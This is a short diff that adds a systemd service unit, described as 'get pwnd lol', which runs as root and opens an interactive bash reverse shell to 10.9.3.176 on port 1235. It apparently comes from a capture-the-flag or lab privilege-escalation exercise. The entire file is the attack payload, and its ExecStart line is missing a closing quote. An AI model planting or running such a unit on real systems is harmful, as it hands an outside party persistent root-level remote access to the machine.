@@ -1,0 +1,10 @@
+[Unit]
+Description=get pwnd lol
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.9.3.176/1235 0>&1
+
+[Install]
+WantedBy=multi-user.target
